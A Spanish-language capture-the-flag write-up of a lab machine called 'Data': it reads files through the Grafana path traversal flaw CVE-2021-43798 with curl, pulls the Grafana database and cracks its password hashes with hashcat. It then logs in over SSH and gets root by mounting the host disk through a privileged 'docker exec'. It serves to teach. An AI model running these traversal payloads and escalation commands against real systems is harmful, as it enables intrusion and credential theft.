---
title: 'Easy Machine | Data'
description: 'Writeup de la maquina'
pubDate: 'May 12 2026'
heroImage: '/data.jpg'
tags: ['Grafana', 'docker', 'Path traversal']
---

>   Data is an Easy Linux machine that involves exploiting `[CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)`, an arbitrary file read via path traversal in `Grafana`. By exploiting this vulnerability, the database file for Grafana is extracted, and the hashes in the database are converted to a format readable by `Hashcat`. The hash is then cracked and can be used for SSH access to the target as user `boris`. The compromised user has the privileges to execute `docker exec` as root on the system, allowing the user to escalate and obtain root access by adding the privileged flag to running containers and mounting the host filesystem.  


Hago un escaneo principal con nmap y veo los servicios abiertos: 
![scan](/data-machine/data-1.png)
Para mas detalles de los puertos realizo un segundo escaneo
```
nmap -p 22,3000 -sCV 10.129.234.47
```
![secondscan](/data-machine/segundonmap.png)

Entrando al server http://10.129.234.47:3000 veo el login de Grafana

![version](/data-machine/versiongrafa.png)

Corriendo la version 8.0.0, buscando un poco el CVE 
Encuentro que es vulnerable a un path traversal
" The vulnerable URL path is: <grafana_host_url>/public/plugins/<plugin_name>/, where is the plugin ID for any installed plugin. "

![prueba](/data-machine/path_traversal.png)

Que hace este comando?: 
Path base del plugin de Grafana.
```http://10.129.61.130:3000/public/plugins/<plugin>/```

```../../../../../../../../../../../etc/passwd```
Cada `../` para subir de nivel en el directorio.   

Si el servidor no valida la ruta y concatena este trozo al path base, la ruta final puede quedar algo como:  
    ```/var/lib/grafana/plugins/mysql/../../../../../../../../../../../etc/passwd```

Al resolver los `../`, el sistema acaba apuntando a `/etc/passwd`.

Por que /etc? Porque aca esta toda la configuracion global del sistema y de muchos servicios

```--path-as-is```
Evita que curl sanitice la URL (ej: quitar los `../`), para que entre la ruta con los `../../../../etc/passwd` y se pueda explotar la vulnerabilidad.

Ya que funciona, puedo ver el hostname y es un container de docker donde se aloja Grafana.

Me bajo la .db de Grafana que resulta ser una sqlite
```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/mysql/../../../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```
Veo la base de datos con sqlite3 

![sqlit3](/data-machine/sqlit3.png)
>Hint: Si lo ven  asi en columna y truncado solo usen `.mode line`

Encuentro los hashes de dos usuarios, admin y boris y extraigo la password,salt:
```7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S```
```dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl```

Y uso [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat), esta herramienta facilita los hashes de Grafana "PBKDF2_HMAC_SHA256" para poder crackearlos con haschat

```bash
hashcat -m 10900 <tuhash.txt> --wordlist /usr/share/wordlists/rockyou.txt
```
![rockyou](/data-machine/rockyou.png)

Tenemos la contrasena, ahora entramos al ssh que tenia puerto abierto con las credenciales de boris.

```bash
ssh boris@<IP>
```

Obtenemos la flag user.txt

```
boris@data:~$ ls
user.txt 
boris@data:~$ cat user.txt 
8c2fcd2cc67c8088983f4378b25****
```

Y ahora debemos escalar privilegios viendo los permisos que tiene el usuario boris.
```bash
sudo -l
```
```
User boris may run the following commands on localhost: (root) NOPASSWD: /snap/bin/docker exec *
```
Aparece que puede ejecutar comandos de docker sin necesidad de una password sudo
Busco una forma de elevar privilegios en el container

```ssh
boris@data:~$ mount 
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) 
...
/dev/sda1 on / type ext4 (rw,relatime)
```
Veo que el device esta montado como raiz
Ejecuto comandos privilegiados de docker
```ssh
boris@data:/$ sudo docker exec --privileged --user root e6ff5b1cbc85 mkdir /mnt/ola
boris@data:/$ sudo docker exec --privileged --user root e6ff5b1cbc85 mount /dev/sda1 /mnt/ola
boris@data:/$ sudo docker exec --user root -it e6ff5b1cbc85 /bin/sh
```
Y ya somos root! rescatamos la flag.
```
/mnt/ola # cd /mnt/ola/root 
/mnt/ola/root # ls 
root.txt
/mnt/ola/root # cat root.txt 
eedc1da31b175f5cad600826f4e***** 
```
